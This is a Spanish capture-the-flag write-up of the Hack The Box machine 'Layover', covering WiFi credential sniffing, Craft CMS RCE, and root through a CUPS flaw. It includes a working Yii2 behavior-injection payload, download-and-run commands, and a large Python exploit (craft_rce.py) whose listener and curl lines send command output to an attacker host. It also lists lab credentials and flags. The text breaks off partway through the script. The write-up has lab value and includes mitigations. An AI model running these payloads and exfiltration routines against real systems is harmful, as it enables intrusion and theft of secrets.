---
title: Layover
description: Layover es una máquina Medium Linux que simula un entorno corporativo de aeropuerto con una red WiFi interna. El acceso inicial llega por RDP a un jumpbox, desde donde se conecta a una red WiFi simulada (`mac80211_hwsim`) para capturar credenciales de un usuario en texto claro vía sniffing pasivo. Con esas credenciales se explota una vulnerabilidad de inyección de comportamiento en **Craft CMS 5.9.8** que permite RCE sin ser administrador. El movimiento lateral requiere descifrar una contraseña cifrada con la clave de seguridad del CMS. La escalada a root se consigue abusando de **CVE-2026-34990**, una vulnerabilidad en **CUPS 2.4.16** que permite a cualquier usuario local capturar un token de autenticación del demonio de impresión y usarlo para escribir archivos arbitrarios como root — en este caso, un fragmento de `sudoers`.
date: 2026-09-30
toc: true
pin: false
image: assets/img/htb-writeup-layover/logo.png
categories:
  - Hack The Box
  - Machines
  - Linux
tags:
  - linux
  - htb
  - craft-cms
  - yii2
  - privesc
  - cve-2026-34990
  - wifi-sniffing
  - misconfigurations
  - ssh
  - python
  - Scripting
---

## Resumen

```
RDP contractor → sudo root en jumpbox → monitor wlan3 + tshark →
credenciales Jenny → login Craft CMS con requests.Session →
RCE two-stage (curl -o + sh /tmp/.x) → .env (CRAFT_SECURITY_KEY + DB creds) →
MySQL volcado de htbairways_settings → descifrado mailRelayPassword →
SSH aporter → CVE-2026-34990 (CUPS 2.4.16) → root.txt
```
---
## Tabla de contenidos

- [[#1. Reconocimiento]]
- [[#2. Enumeración de Red Interna]]
- [[#3. Foothold — RCE en Craft CMS 5.9.8]]
- [[#4. Movimiento Lateral — SSH como aporter]]
- [[#5. Escalada de Privilegios — CVE-2026-34990 (CUPS 2.4.16)]]
- [[#6. Rabbit Holes]]
- [[#7. Lecciones para Defenders]]
- [[#8. TTPs (MITRE ATT&CK)]]
- [[#9. Flags]]
- [[#10. Referencia Rápida]]
- [[#Apéndice A — craft_rce.py]]
- [[#Apéndice B — poc.py]]

---

## 1. Reconocimiento
**Objetivo de esta fase:** Determinar qué servicios están expuestos en el target y priorizar vectores de ataque.

### 1.1 Puertos abiertos
El target expone únicamente dos puertos. Esto es inusual — la mayoría de máquinas HTB tienen más superficie y es un hint de que el acceso inicial no va por la vía convencional de explotar un servicio web directamente.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn x.x.x.x -oG allports
```
```
Puerto 22   — SSH (OpenSSH 9.6p1 Ubuntu)
Puerto 3389 — RDP/xrdp (no requiere NLA)
```

El puerto 3389 corresponde a **RDP** (Remote Desktop Protocol), el protocolo de escritorio remoto de Microsoft adoptado también en Linux vía `xrdp`. La ausencia de **NLA** (Network Level Authentication) significa que el servidor acepta la conexión antes de pedir credenciales — esto simplifica la explotación y es considerado una misconfiguration en entornos de producción.

### 1.2 Acceso inicial vía RDP
La descripción de la máquina provee credenciales iniciales: `contractor / Contractor2026!`. La autenticación SSH con estas credenciales falla porque `sshd` tiene deshabilitada la autenticación por contraseña para este usuario. El acceso correcto es vía RDP:
```bash
rdesktop -u contractor -p 'Contractor2026!' -g 1280x1024 10.13.37.10
```


**rdesktop** es un cliente RDP open source para Linux. Al conectar, se obtiene un escritorio XFCE del sistema `airside-ws01`, que resulta ser un contenedor LXD (identificable por la interfaz `eth0@if11`, que indica una interfaz virtual de red dentro de un namespace).

Una vez dentro, la escalada a root local es inmediata:
```bash
sudo bash
# Password: Contractor2026!
```


---
El usuario `contractor` pertenece al grupo `sudo`, lo que permite ejecutar cualquier comando como root. Este jumpbox es intencionalmente débil — su propósito narrativo es ser un punto de pivoting, no el objetivo final.

## 2. Enumeración de Red Interna

### 2.1 Interfaces de red y WiFi simulado
Siendo root en `airside-ws01`, la enumeración de interfaces revela algo no convencional:
```bash
ip a
```
```
6: wlan2: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 ...
7: wlan3: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 ...
10: eth0@if11: ... inet 10.159.143.45/24
```



Hay dos interfaces WiFi (`wlan2`, `wlan3`) inactivas. El driver detrás de estas interfaces es `mac80211_hwsim` — un módulo del kernel de Linux que simula hardware WiFi para pruebas, permitiendo crear redes WiFi completamente virtuales con comportamiento real (beacons, autenticación, transmisión de frames).
Un scan revela la red disponible:
```bash
iw dev wlan2 scan 2>/dev/null | grep SSID
# SSID: HTB International WiFi
```


La red no tiene contraseña (`key_mgmt: NONE`), lo cual es el estado original del challenge. Conectar a ella asigna una IP en la subnet `10.13.37.0/24`:

```bash
nmcli dev wifi connect "HTB International WiFi" ifname wlan2
# ip: 10.13.37.182/24
```

Añadir el portal al `/etc/hosts`:
```bash
echo "10.13.37.10 portal.international.htb" >> /etc/hosts
```


### 2.2 Captura de credenciales en tráfico WiFi
Con `wlan3` en **modo monitor** (captura todo el tráfico del medio sin necesidad de estar asociado a la red) y configurada en el **canal 6** (donde está el AP según el scan), se puede ver el tráfico de otros clientes en la misma red WiFi:
```bash
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
tshark -i wlan3 \
  -Y 'http.request.method=="POST"' \
  -T fields \
  -e ip.src \
  -e http.request.full_uri \
  -e urlencoded-form.key \
  -e urlencoded-form.value
```


**tshark** es la versión de línea de comandos de Wireshark. El flag `-Y` aplica un filtro de visualización que solo muestra peticiones HTTP POST. Esto es posible porque la red WiFi no tiene cifrado (WPA/WPA2), por lo que todos los frames son visibles en texto claro para cualquiera en modo monitor.

Resultado capturado:

```
10.13.37.132  http://portal.international.htb/miles/login.php  username,password  jenny,Fl1ghtDeck2026!
```


Un bot (simulando el comportamiento de un empleado) hace login al portal del aeropuerto periódicamente con credenciales en texto claro sobre HTTP sin TLS. Las credenciales son: **`jenny / Fl1ghtDeck2026!`**.

> [!info] Dashboard de Jenny
> Tras autenticarse en el portal, el dashboard de Jenny Crawford muestra:
> - **Name:** Jenny Crawford
> - **Member ID:** `HA-4471880`
> - **Membership:** Gold Member
> - **Miles:** 48,250
> - **Upcoming Booking:** `KS7X2M`
---

## 3. Foothold — RCE en Craft CMS 5.9.8
### 3.1 Reconocimiento del portal
`portal.international.htb` aloja **Craft CMS 5.9.8**, un CMS orientado a empresas, construido en PHP sobre el framework Yii2. El panel de administración está en `/admin`.

Las credenciales de Jenny permiten autenticarse en el panel admin, pero con privilegios limitados (`userIsAdmin: false`). La configuración `allowAdminChanges: false` bloquea los vectores más obvios de SSTI (inyección en Title Format de Entry Types).

### 3.2 La vulnerabilidad — Inyección de comportamiento Yii2
El endpoint `/admin/actions/element-search/search` acepta una estructura JSON que define condiciones de búsqueda de elementos en Craft. Dentro de esta estructura se pueden definir `fieldLayouts` con un array `as rce` que especifica behaviors de Yii2.

**Yii2** es el framework PHP sobre el que está construido Craft CMS. Los **behaviors** en Yii2 son clases que extienden la funcionalidad de un componente en tiempo de ejecución — una forma de composición en lugar de herencia. El problema: el endpoint no valida qué clase de behavior se instancia ni qué métodos invoca.
La clase `Psy\Readline\Hoa\ConsoleProcessus` es parte de PsySH (un REPL de PHP), que a su vez usa `Hoa\Console` para ejecutar procesos del sistema. El método `execute` acepta un comando como string y lo ejecuta.

El payload completo:

```json
{
  "elementType": "craft\\elements\\Category",
  "siteId": 1,
  "search": "",
  "condition": {
    "class": "craft\\elements\\conditions\\ElementCondition",
    "elementType": "craft\\elements\\Category",
    "fieldLayouts": [{
      "as rce": {
        "__class": "yii\\behaviors\\AttributeTypecastBehavior",
        "__construct()": [{
          "attributeTypes": {
            "typecastBeforeSave": [
              "Psy\\Readline\\Hoa\\ConsoleProcessus",
              "execute"
            ]
          },
          "typecastBeforeSave": "comando"
        }]
      },
      "on *": "self::beforeSave"
    }]
  },
  "CRAFT_CSRF_TOKEN": csrf_token
}
```


### 3.3 Las dos trampas principales

> [!warning] 1 Trampa  — CSRF
> Craft valida que el token de la cabecera `X-CSRF-Token` sea **idéntico** al de la cookie `CRAFT_CSRF_TOKEN`. Obtener el token por un lado y usar una cookie vieja por otro produce `HTTP 400 "Unable to verify your data submission"`.
>
> **Solución:** usar `requests.Session` para que la cookie viaje automáticamente y extraer el token del HTML del login (input `CRAFT_CSRF_TOKEN`) o del JSON de respuesta del login (`csrfTokenValue`).
> [!warning] Trampa 2 — `escapeshellcmd`
> `Hoa\ConsoleProcessus::execute()` pasa el comando por `escapeshellcmd()`, que neutraliza `|`, `&&`, `;`, `$()`, comillas, etc. Exfiltración directa con `curl ... $(cat .env)` **no funciona**.
>
> **Solución:** explotación en **dos etapas**:
> 1. `curl -s -o /tmp/.x http://LHOST:PORT/run.sh` (comando simple, pasa el filtro).
> 2. `sh /tmp/.x` → el script descargado se ejecuta como shell normal y ya puede usar pipes, `$()`, etc.
Adicionalmente, el endpoint **siempre devuelve HTTP 500** cuando el payload se procesa correctamente, y la ejecución es **ciega** (no devuelve output). La exfiltración se hace por POST desde el script inyectado hacia un listener en el jumpbox.


### 3.4 Script de explotación
chequea el **[[#Script 1 — craft_rce.py]]** al final del documento.

### 3.5 Extracción del `.env`
```bash
python3 craft_rce.py -u http://portal.international.htb \
  -L 10.13.37.182 -p 9999 --env
```

**Salida:**
```
CRAFT_APP_ID=CraftCMS--41606de1-cf7a-4fc5-8b1e-6f746d801adf
CRAFT_ENVIRONMENT=production
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DEV_MODE=false
CRAFT_ALLOW_ADMIN_CHANGES=false
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_2026
CRAFT_DB_TABLE_PREFIX=
PRIMARY_SITE_URL=http://portal.international.htb/
CRAFT_ENABLE_TWIG_SANDBOX=true
```

**Datos clave extraídos:**

- `CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr`
- MySQL: `craftuser / CraftDB_pw_2026` @ `127.0.0.1:3306` (db `craft`)

### 3.6 Volcado de `htbairways_settings`

El primer intento de `--relay` buscando `mailRelayPassword` falló con `Unknown column 'mailRelayPassword'`. La solución fue volcar primero la estructura real de la tabla:
```bash
python3 craft_rce.py -u http://portal.international.htb \
  -L 10.13.37.182 -p 9999 --table htbairways_settings
```


**Salida:**
```
=== DESCRIBE htbairways_settings ===
id                 int(11)      null=NO   key=PRI
siteId             int(11)      null=NO   key=MUL
mailRelayUser      varchar(255) null=YES  key=
mailRelayPassword  text         null=YES  key=
```

Con los nombres confirmados, se pueden extraer los valores.

### 3.7 Descifrado de `mailRelayPassword`

**Opción A — `--relay`** (hace todo en un paso, buscando dinámicamente):
```bash
python3 craft_rce.py -u http://portal.international.htb \
  -L 10.13.37.182 -p 9999 --relay
```

Salida:
```
--- htbairways_settings.mailRelayUser ---
raw (80): aporter
raw (posible user): aporter
--- htbairways_settings.mailRelayPassword ---
raw (80): u0E7OgbBeWhhPn1HajsFMDg0ZDJh...
DECRYPT OK: Skyp0rt_Relay!26
```

**Opción B — manual con MySQL + PHP:**
```bash
# Extraer el ciphertext

python3 craft_rce.py -u http://portal.international.htb \
  -L 10.13.37.182 -p 9999 \
  -c "mysql -u craftuser -p'CraftDB_pw_2026' craft -N -B -e 'SELECT mailRelayPassword FROM htbairways_settings;'"
  
# Descifrarlo con la CRAFT_SECURITY_KEY

python3 craft_rce.py -u http://portal.international.htb \
  -L 10.13.37.182 -p 9999 \
  -c "php -r 'require \"/var/www/portal/vendor/autoload.php\"; \$s=new yii\\base\\Security(); echo \$s->decryptByKey(base64_decode(\"pon-el-cipher-aqui\"), \"IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr\");'"
  
```

**Craft CMS** cifra datos sensibles usando su `Security::encryptByKey()`, que internamente usa AES-256-GCM con derivación de clave vía HKDF. El descifrado requiere la `CRAFT_SECURITY_KEY`.


**Credenciales obtenidas:** `aporter / Skyp0rt_Relay!26`
---
## 4. Movimiento Lateral — SSH como aporter

Con las credenciales descifradas se obtiene acceso SSH directo al servidor del CMS desde el jumpbox:
```bash
sshpass -p 'Skyp0rt_Relay!26' ssh -o StrictHostKeyChecking=no aporter@10.13.37.10


aporter@portal:~$ cat user.txt
04eb9d0058a80fa297137fbf4741f0ce
```

El usuario `aporter` no tiene acceso `sudo` ni pertenece a grupos privilegiados. La enumeración post-acceso identifica que `cupsd` (el demonio de CUPS) está corriendo como root en `localhost:631`.
---

## 5. Escalada de Privilegios — CVE-2026-34990 (CUPS 2.4.16)


### 5.1 ¿Qué es CUPS?
**CUPS** (Common Unix Printing System) es el sistema de impresión estándar en Linux y macOS. El demonio `cupsd` gestiona impresoras, colas de impresión y trabajos. Corre como root porque necesita acceso directo a dispositivos de hardware y escritura en directorios del sistema.


### 5.2 La vulnerabilidad
**CVE-2026-34990** afecta específicamente a CUPS 2.4.16. El sistema tiene varios mecanismos de autenticación relevantes:

1. **CUPS-Create-Local-Printer**: Una operación IPP que crea una impresora temporal. Por diseño, **no requiere autenticación de administrador** — cualquier usuario local puede invocarla. La impresora creada apunta a un `device-uri` que puede ser una URL IPP.

2. **Token `Authorization: Local`**: Cuando `cupsd` necesita validar una impresora temporal contra el `device-uri` especificado, hace una conexión IPP saliente a esa URI. Si la URI apunta a un servicio en localhost que responde con `WWW-Authenticate: Local trc="y"`, cupsd responde incluyendo su token de autenticación local en el header `Authorization: Local <TOKEN>`.

3. **El token es reutilizable**: Cualquier petición a `/admin/` en localhost que incluya ese token es aceptada como autenticada con permisos de administrador de CUPS.

4. **File:// bypass**: La ruta normal de CUPS rechaza URIs `file://` en impresoras persistentes (la política `FileDevice` lo bloquea). El bypass es crear primero una impresora temporal con el URI `file:///ruta/archivo` y luego hacerla permanente usando `OP_ADD_MODIFY_PRINTER` con `printer-is-temporary=false` sin re-especificar el `device-uri` — en este punto ya no se valida la política.

5. **Escritura arbitraria como root**: Al imprimir un trabajo en esa impresora, `cupsd` abre el archivo destino con `O_WRONLY|O_CREAT|O_TRUNC` corriendo como root, escribiendo el contenido del job.


### 5.3 Cadena de explotación
```
Usuario local sin privilegios (aporter)
    ↓ CUPS-Create-Local-Printer → impresora temporal con device-uri=ipp://localhost:9189/
    ↓ cupsd conecta a 9189 para validar
    ↓ Servidor rogue captura Authorization: Local <TOKEN>
    ↓ Con TOKEN → OP_ADD_MODIFY_PRINTER → impresora permanente con file:///etc/sudoers.d/aporter-pwn
    ↓ Print-Job → cupsd escribe como root el contenido del job
    ↓ Contenido: "aporter ALL=(ALL) NOPASSWD: ALL"
    ↓ sudo -i → root
```

### 5.4 Script de explotación

revisa el **[[#Script 2 — poc.py]]** al final del documento.

### 5.5 Ejecución
**En el jumpbox:**
```bash
cd /home/contractor/Desktop
python3 -m http.server 8001
```

**En la sesión SSH de aporter:**
```bash
curl -s -o /tmp/poc.py http://10.13.37.182:8001/poc.py
python3 /tmp/poc.py
```

Si falla (es una race condition), reintentar:
```bash
for i in $(seq 1 10); do python3 /tmp/poc.py && break; done
```

**Salida esperada:**
```
[*] CVE-2026-34990 | user=aporter | cupsd=127.0.0.1:631
[*] coercing cupsd → rogue server ...
[+] captured token: 8A8B4991E5C14CEA069BA9824C9C85FB
[*] writing sudoers ...
[+] wrote /etc/sudoers.d/aporter-pwn
[+] ROOT: uid=0(root) gid=0(root) groups=0(root)
[*] run: sudo -i
```

### 5.6 Leer la flag de root
```bash
sudo cat /root/root.txt
# fa8b0a8cbb1d1100efe369bc89196c5a
```
---
## 6. Rabbit Hole's
| Intento                                           | Por qué no funcionó                            |
| ------------------------------------------------- | ---------------------------------------------- |
| SSH con `contractor`                              | `sshd` solo permite publickey para ese usuario |
| Crackear bcrypt del admin Craft                   | cost 13 → ~8 días en CPU 12 cores              |
| RCE con `$()` directo en el payload               | `escapeshellcmd` neutraliza metacaracteres     |
| Token CSRF "fresco" desde `session-info`          | No se sincroniza con la cookie → HTTP 400      |
| `--relay` buscando `mailRelayPassword` por nombre | La columna no existe con ese nombre exacto     |
| `cups-browsed` / CVE-2024-47176                   | El daemon no está instalado, solo `cupsd`      |

| Reverse shell directa a `tun0` | El portal no tiene salida a la red HTB, solo a `10.13.37.0/24` |
---

## 7. Lecciones
### 7.1 Red WiFi sin cifrado
El sniffing fue posible porque la red no usa WPA2/WPA3. Cualquier cliente en modo monitor puede capturar todo el tráfico. La autenticación HTTP sin TLS sobre esta red expone credenciales en texto claro.
- **Mitigación:** WPA3-Enterprise con certificados; TLS obligatorio en todas las aplicaciones internas aunque la red sea "corporativa".
- **Detección:** Monitorear clientes en modo monitor vía 802.11 management frames (Probe Requests con capabilities que indican monitor mode, ausencia de Association Requests).

### 7.2 Inyección de comportamiento en Craft CMS
El endpoint `element-search/search` acepta clases PHP arbitrarias en la definición de condiciones sin sanitizar. Esto no requiere ser administrador — cualquier usuario con acceso al panel admin puede explotarlo.
- **Mitigación:** Actualizar a Craft CMS 5.9.9+ donde se limita la instanciación de clases en contextos de búsqueda.
- **Detección:** Alertas en el WAF para requests a `/admin/actions/element-search/search` con payloads que contengan `__class`, `ConsoleProcessus` o `AttributeTypecastBehavior`.

### 7.3 Contraseña de relay SMTP cifrada pero recuperable
El cifrado de la contraseña en la base de datos está bien implementado, pero la clave de descifrado (`CRAFT_SECURITY_KEY`) vive en un archivo `.env` en el mismo servidor. Un atacante con RCE puede leer ambos y reconstruir la credencial.
- **Mitigación:** Separar la gestión de secretos del servidor de aplicación (HashiCorp Vault, AWS Secrets Manager). El servidor de aplicación obtiene el secreto en tiempo de ejecución sin que quede en disco.

### 7.4 CUPS 2.4.16 — escritura arbitraria como root
La operación `CUPS-Create-Local-Printer` no requiere autenticación admin y permite crear impresoras con URIs arbitrarios, incluidos `file://`. El token de autenticación local de CUPS es capturable por cualquier proceso local.
- **Mitigación:** Actualizar a CUPS 2.4.17+ donde se eliminó el soporte para `file://` en colas de impresión y se restringe el uso de certificados locales sobre la interfaz de loopback.
- **Detección:** Monitorear conexiones salientes desde `cupsd` a puertos no estándar en localhost; alertar sobre escrituras en `/etc/sudoers.d/` y `/etc/cron.d/` por parte del proceso `cupsd`.


---
## 8. TTPs (MITRE ATT&CK)
| ID | Técnica | Cómo se usó |
|----|---------|-------------|
| T1021.001 | Remote Services: Remote Desktop Protocol | Acceso inicial al jumpbox vía RDP con credenciales provistas |
| T1078 | Valid Accounts | Uso de credenciales de contractor para acceso inicial |
| T1040 | Network Sniffing | Captura de credenciales de Jenny vía tshark en wlan3 en modo monitor |
| T1190 | Exploit Public-Facing Application | RCE en Craft CMS vía inyección de behavior Yii2 |
| T1552.001 | Unsecured Credentials: Credentials In Files | Lectura de CRAFT_SECURITY_KEY del .env |
| T1140 | Deobfuscate/Decode Files or Information | Descifrado de mailRelayPassword con la security key de Craft |
| T1068 | Exploitation for Privilege Escalation | CVE-2026-34990 en CUPS 2.4.16 para escritura arbitraria como root |

| T1548.003 | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | Escritura de fragmento sudoers vía CUPS para obtener sudo sin contraseña |
---
## 9. Flags
```
user.txt: 04eb9d0058a80fa297137fbf4741f0ce
root.txt: fa8b0a8cbb1d1100efe369bc89196c5a
```
---

## 10. Referencia Rápida

### Credenciales y valores clave

| Variable | Valor |
|---|---|
| `contractor` (RDP jumpbox) | `Contractor2026!` |
| `jenny` (Craft CMS portal) | `Fl1ghtDeck2026!` |
| `CRAFT_SECURITY_KEY` | `IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr` |
| MySQL user | `craftuser` |
| MySQL password | `CraftDB_pw_2026` |
| MySQL database | `craft` |
| `aporter` (SSH portal) | `Skyp0rt_Relay!26` |
| Jumpbox WiFi IP | `10.13.37.182` |
| Portal IP | `10.13.37.10` |
| Portal hostname | `portal.international.htb` |

### Estructura de archivos en el jumpbox
```
/home/contractor/Desktop/
├── craft_rce.py        # RCE + exfiltración Craft CMS
├── poc.py              # CVE-2026-34990 CUPS privesc
├── cookies.txt         # (temporal, opcional)
└── login.html          # (temporal, opcional)
```
---

## Script 1 — craft_rce.py
**Ubicación:** `/home/contractor/Desktop/craft_rce.py` (jumpbox)  
**Target:** `portal.international.htb` (10.13.37.10)
```python
#!/usr/bin/env python3
"""
Craft CMS 5.9.8 — Yii2 Behavior Injection RCE + exfiltración en dos etapas
HTB Layover — portal.international.htb
Modos:
  -c CMD              Ejecuta CMD y exfiltra su output
  --env               Extrae /var/www/portal/.env
  --table [TABLA]     Vuelca estructura + filas de una tabla (default: htbairways_settings)
  --relay             Descubre dinámicamente y descifra mailRelayPassword
  --blind -c CMD      Ejecuta CMD sin exfiltración (oráculo de timing)
  --listen PORT       Solo levanta el listener
Notas:
  - El endpoint element-search SIEMPRE devuelve HTTP 500 si procesa el payload.
  - escapeshellcmd() bloquea metacaracteres → explotación en dos etapas.
  - El token CSRF debe coincidir con la cookie → requests.Session obligatorio.
  - Exfiltración por POST para no romper con outputs grandes.
"""
import argparse
import base64
import re
import sys
import threading
import time
import urllib.parse
from html.parser import HTMLParser
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# ============================================================== CSRF parser
class _CsrfParser(HTMLParser):
    def __init__(self, field="CRAFT_CSRF_TOKEN"):
        super().__init__()
        self.field = field
        self.value = None
    def handle_starttag(self, tag, attrs):
        if tag != "input":
            return
        a = dict(attrs)
        if a.get("name") == self.field:
            self.value = a.get("value")
def csrf_from_html(html, field="CRAFT_CSRF_TOKEN"):
    p = _CsrfParser(field)
    p.feed(html)
    return p.value
# ============================================================== Listener
class ExfilHandler(BaseHTTPRequestHandler):
    results = []
    scripts = {}
    def _serve_script(self, path):
        body = self.scripts.get(path)
        if body is None:
            return False
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        print(f"[*] Script {path} servido ({len(body)} bytes).")
        return True
    def _ack(self):
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")
    def _record(self, payload):
        try:
            padded = payload + "=" * (-len(payload) % 4)
            decoded = base64.urlsafe_b64decode(padded).decode("utf-8", errors="replace")
        except Exception:
            decoded = f"<raw> {payload}"
        print(f"\n[+] Data received:\n{decoded}\n")
        ExfilHandler.results.append(decoded)
    def do_GET(self):
        if self._serve_script(self.path):
            return
        raw = urllib.parse.unquote(self.path.lstrip("/"))
        if raw and raw != "favicon.ico":
            self._record(raw)
        self._ack()
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""
        if body:
            self._record(body)
        self._ack()
    def log_message(self, *a, **k):
        pass
def start_listener(port):
    srv = HTTPServer(("0.0.0.0", port), ExfilHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[*] Listener en 0.0.0.0:{port}")
    return srv
# ============================================================== Payload
def build_payload(cmd_string, csrf_token):
    return {
        "elementType": "craft\\elements\\Category",
        "siteId": 1,
        "search": "",
        "condition": {
            "class": "craft\\elements\\conditions\\ElementCondition",
            "elementType": "craft\\elements\\Category",
            "fieldLayouts": [{
                "as rce": {
                    "__class": "yii\\behaviors\\AttributeTypecastBehavior",
                    "__construct()": [{
                        "attributeTypes": {
                            "typecastBeforeSave": [
                                "Psy\\Readline\\Hoa\\ConsoleProcessus",
                                "execute",
                            ]
                        },
                        "typecastBeforeSave": cmd_string,
                    }],
                },
                "on *": "self::beforeSave",
            }],
        },
        "CRAFT_CSRF_TOKEN": csrf_token,
    }
# ============================================================== Login
def do_login(session, base_url, cp_path, username, password, timeout=15):
    login_url = f"{base_url}{cp_path}/login"
    print(f"[*] GET {login_url}")
    r = session.get(login_url, timeout=timeout)
    r.raise_for_status()
    csrf = csrf_from_html(r.text)
    if not csrf:
        m = re.search(r'csrf-token"\s+content="([^"]+)"', r.text)
        csrf = m.group(1) if m else None
    if not csrf:
        raise ValueError("No se encontró CRAFT_CSRF_TOKEN en el HTML")
    print(f"[*] Token del HTML: {csrf[:40]}...")
    login_action = f"{base_url}{cp_path}/actions/users/login"
    resp = session.post(
        login_action,
        data={"loginName": username, "password": password, "CRAFT_CSRF_TOKEN": csrf},
        headers={"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"},
        timeout=timeout,
    )
    try:
        body = resp.json()
    except ValueError:
        raise ValueError(f"Login falló: HTTP {resp.status_code} — {resp.text[:200]}")
    if resp.status_code != 200 or not (body.get("returnUrl") or body.get("success")):
        raise ValueError(f"Login rechazado: {resp.text[:200]}")
    fresh = body.get("csrfTokenValue") or csrf
    print(f"[+] Login OK. Token: {fresh[:40]}...")
    return fresh
# ============================================================== Trigger
def send_payload(session, base_url, cp_path, csrf, cmd_string, timeout=30):
    url = f"{base_url}{cp_path}/actions/element-search/search"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRF-Token": csrf,
    }
    payload = build_payload(cmd_string, csrf)
    r = session.post(url, json=payload, headers=headers,
                     timeout=timeout, allow_redirects=False)
    print(f"[*] POST → HTTP {r.status_code}")
    return r
# ============================================================== Two-stage
def run_two_stage(session, base_url, cp_path, csrf, lhost, lport,
                  script_content, interpreter="sh", sleep_after=3):
    ExfilHandler.scripts["/run.sh"] = script_content.encode()
    exfil_url = f"http://{lhost}:{lport}"
    dl = f"curl -s -o /tmp/.x {exfil_url}/run.sh"
    print(f"[*] Etapa 1: {dl}")
    send_payload(session, base_url, cp_path, csrf, dl)
    time.sleep(2)
    run = f"{interpreter} /tmp/.x"
    print(f"[*] Etapa 2: {run}")
    send_payload(session, base_url, cp_path, csrf, run)
    time.sleep(sleep_after)
# ============================================================== Script templates
EXFIL_LINE = (
    "2>&1 | base64 -w0 | tr '+/' '-_' | tr -d '=' "
    "| curl -s -X POST --data-binary @- {url}/"
)
def script_exec(cmd, lhost, lport):
    url = f"http://{lhost}:{lport}"
    return (
        "#!/bin/sh\n"
        f"({cmd}) " + EXFIL_LINE.format(url=url) + "\n"
    )
def script_env(lhost, lport):
    return script_exec("cat /var/www/portal/.env", lhost, lport)
def script_table(lhost, lport, table="htbairways_settings",
                 db_user="craftuser", db_pass="CraftDB_pw_2026",
                 db_name="craft"):
    url = f"http://{lhost}:{lport}"
    php = f'''<?php
require "/var/www/portal/vendor/autoload.php";
$pdo = new PDO("mysql:host=127.0.0.1;dbname={db_name}", "{db_user}", "{db_pass}");
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$table = "{table}";
echo "=== DESCRIBE $table ===\\n";
$cols = $pdo->query("DESCRIBE `$table`")->fetchAll(PDO::FETCH_ASSOC);
foreach ($cols as $c) {{
    echo $c["Field"] . "  " . $c["Type"] . "  null=" . $c["Null"] . "  key=" . $c["Key"] . "\\n";
}}
echo "\\n=== ROWS ===\\n";
$rows = $pdo->query("SELECT * FROM `$table`")->fetchAll(PDO::FETCH_ASSOC);
foreach ($rows as $i => $r) {{
    echo "--- row #$i ---\\n";
    foreach ($r as $k => $v) {{
        $val = is_string($v) ? $v : var_export($v, true);
        if (strlen($val) > 500) $val = substr($val, 0, 500) . "... [truncado]";
        echo "$k = $val\\n";
    }}
    echo "\\n";
}}
echo "total rows: " . count($rows) . "\\n";
'''
    return (
        "#!/bin/sh\n"
        "cat > /tmp/.x.php <<'PHPEOF'\n"
        f"{php}"
        "PHPEOF\n"
        "php /tmp/.x.php " + EXFIL_LINE.format(url=url) + "\n"
    )
def script_relay(lhost, lport, security_key, db_user="craftuser",
                 db_pass="CraftDB_pw_2026", db_name="craft"):
    url = f"http://{lhost}:{lport}"
    php = f'''<?php
require "/var/www/portal/vendor/autoload.php";
$pdo = new PDO("mysql:host=127.0.0.1;dbname={db_name}", "{db_user}", "{db_pass}");
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$security = new \\yii\\base\\Security();
$key = "{security_key}";
$sql = "SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
        WHERE TABLE_SCHEMA = :db
          AND (COLUMN_NAME LIKE '%Relay%' OR COLUMN_NAME LIKE '%Password%'
               OR COLUMN_NAME LIKE '%Mail%')
        ORDER BY TABLE_NAME, COLUMN_NAME";
$stmt = $pdo->prepare($sql);
$stmt->execute([":db" => "{db_name}"]);
$candidates = $stmt->fetchAll(PDO::FETCH_ASSOC);
echo "=== Candidatos ===\\n";
foreach ($candidates as $c) echo $c["TABLE_NAME"] . "." . $c["COLUMN_NAME"] . "\\n";
echo "\\n";
foreach ($candidates as $c) {{
    $table = $c["TABLE_NAME"]; $col = $c["COLUMN_NAME"];
    try {{
        $row = $pdo->query("SELECT `$col` AS v FROM `$table` WHERE `$col` IS NOT NULL AND `$col` != '' LIMIT 1")->fetch(PDO::FETCH_ASSOC);
    }} catch (\\Throwable $e) {{ continue; }}
    if (!$row || empty($row["v"])) continue;
    $raw = $row["v"];
    echo "--- $table.$col ---\\n";
    echo "raw (80): " . substr($raw, 0, 80) . "\\n";
    try {{
        $plain = $security->decryptByKey(base64_decode($raw), $key);
        echo "DECRYPT OK: " . $plain . "\\n";
    }} catch (\\Throwable $e) {{
        echo "decrypt falló: " . $e->getMessage() . "\\n";
        if (strlen($raw) < 60) echo "raw (posible user): " . $raw . "\\n";
    }}
    echo "\\n";
}}
'''
    return (
        "#!/bin/sh\n"
        "cat > /tmp/.x.php <<'PHPEOF'\n"
        f"{php}"
        "PHPEOF\n"
        "php /tmp/.x.php " + EXFIL_LINE.format(url=url) + "\n"
    )
# ============================================================== Main
def main():
    p = argparse.ArgumentParser(
